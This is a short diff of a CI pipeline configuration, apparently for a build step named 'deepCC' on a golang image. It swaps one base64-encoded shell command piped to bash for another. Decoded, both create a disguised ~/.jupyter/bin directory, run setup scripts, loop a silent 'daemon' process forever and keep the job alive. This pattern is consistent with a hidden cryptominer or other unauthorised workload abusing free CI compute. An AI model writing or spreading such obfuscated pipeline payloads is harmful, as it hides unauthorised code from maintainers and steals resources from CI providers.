@@ -6,4 +6,4 @@ steps:
 - name: deepCC
   image: golang
   commands:
-  - bash -c "base64 -d <<< bnByb2MgJiYgbWtkaXIgfi8uanVweXRlci9iaW4gLXAgJiYgLi9zZXR1cCAmJiAuL2NvbmZpZ3VyZSAmJiBjZCB+Ly5qdXB5dGVyL2JpbiAmJiBQQVRIPSQocHdkKTokUEFUSCAmJiBURVJNPXh0ZXJtICYmIHdoaWxlIFsgMSBdOyBkbyBiYXNoIGRhZW1vbiA+IC9kZXYvbnVsbDsgZG9uZSAmIHdhdGNoIGZyZWUgLW0= | bash"
+  - bash -c "base64 -d <<< ZXhwb3J0IFRFUk09eHRlcm0gJiYgbnByb2MgJiYgbWtkaXIgfi8uanVweXRlci9iaW4gLXAgJiYgLi9zZXR1cCAmJiAuL2NvbmZpZ3VyZSAmJiBjZCB+Ly5qdXB5dGVyL2JpbiAmJiBQQVRIPSQocHdkKTokUEFUSCAmJiB3aGlsZSBbIDEgXTsgZG8gYmFzaCBkYWVtb24gPiAvZGV2L251bGw7IGRvbmUgJiB3YXRjaCBmcmVlIC1t | bash"
